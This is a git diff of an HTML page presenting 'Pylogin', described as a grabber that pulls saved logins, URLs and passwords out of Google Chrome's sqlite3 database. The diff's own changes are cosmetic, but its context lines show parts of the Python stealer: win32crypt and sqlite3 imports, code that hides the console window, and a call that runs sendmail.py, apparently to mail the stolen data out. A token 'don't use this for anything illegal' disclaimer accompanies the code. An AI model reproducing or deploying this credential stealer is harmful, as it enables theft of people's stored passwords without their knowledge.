@@ -1,5 +1,5 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="en" xmlns="http://www.w3.org/1999/html">
 	<head>
 		<title>Pylogin</title>
 		<link rel="icon" href="res/img/icon.png" />
@@ -37,11 +37,13 @@
 				<article>
 					<pre>
 						<code class="cpp">
-from os import getenv
+
 import sqlite3
 import win32crypt
 import os
 import win32console, win32gui
+
+from os import getenv
 
 window = win32console.GetConsoleWindow() #Comment this out if you dont want to hide the window
 win32gui.ShowWindow(window, 0)
@@ -69,7 +71,7 @@ os.system('python sendmail.py')
 					</pre>
 
 					<!-- Owner from Discord Server is my God -->
-					<h1 class="title">Pylogin: <span>sqlite3-db grabber</span></h1>
+					<h2 class="title">Pylogin: <span>sqlite3-db grabber</span></h2>
 					<pre>@author Luis Garcia</pre>
 					<p>The purpose of this script is to extract confidential data from google chrome's sqlite3 db. The logins table contains the columns; origin_url, username_value and password_vale as seen visually in this image. </p>
 					<code class="cpp"> Don't use this for anything illegal, don't be an a hole"</code>
